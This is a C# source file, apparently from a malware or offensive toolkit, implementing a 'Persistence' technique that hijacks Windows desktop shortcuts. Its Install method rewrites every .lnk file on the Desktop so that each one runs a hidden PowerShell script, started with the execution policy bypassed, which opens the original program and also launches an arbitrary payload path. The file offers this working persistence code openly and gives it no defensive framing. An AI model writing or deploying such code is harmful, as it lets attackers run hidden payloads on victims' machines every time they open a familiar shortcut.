using System.Text;

namespace Main.Source.Utilities.Persistence
{
    public class ImpersonateLNKs
    {
        private const string ShortcutsFolderName = "Saved Links";

        public static void Install(string path)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            string shortcutsFolderPath = Path.Combine(userProfile, ShortcutsFolderName);
            if (!Directory.Exists(shortcutsFolderPath))
            {
                Directory.CreateDirectory(shortcutsFolderPath);
            }

            var links = FindLNKs();
            if (links.Count == 0)
            {
                Logger.Warn("ImpersonateLNKs.Install: there are no link files");
                return;
            }

            foreach (var link in links)
            {
                var info = Shortcut.GetShortcutInfo(link);
                if (info == null)
                {
                    continue;
                }

                string scriptName = Path.GetFileNameWithoutExtension(link) + ".ps1";
                string scriptPath = Path.Combine(shortcutsFolderPath, scriptName);

                var content = new StringBuilder();
                content.AppendLine($"Set-Location -Path {info.OpenIn}");
                content.AppendLine($"Start-Process -Path {info.Target}");
                content.AppendLine($"Start-Process -Path {path}");

                File.WriteAllText(scriptPath, content.ToString());

                Shortcut.OverwriteShortcut(
                    Path.GetFullPath(link),
                    target: $"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"{scriptPath}\"",
                    openIn: shortcutsFolderPath
                );
            }
        }
        
        public static void Uninstall()
        {

        }

        public static int Check()
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            string shortcutsFolderPath = Path.Combine(userProfile, ShortcutsFolderName);
            if (!Directory.Exists(shortcutsFolderPath))
            {
                return 0;
            }

            return Files.CountFiles(shortcutsFolderPath);
        }

        private static List<string> FindLNKs()
        {
            var files = new List<string>();

            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            foreach (var file in Directory.GetFiles(desktop))
            {
                if (file.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase))
                {
                    files.Add(file);
                }
            }

            return files;
        }
    }
}
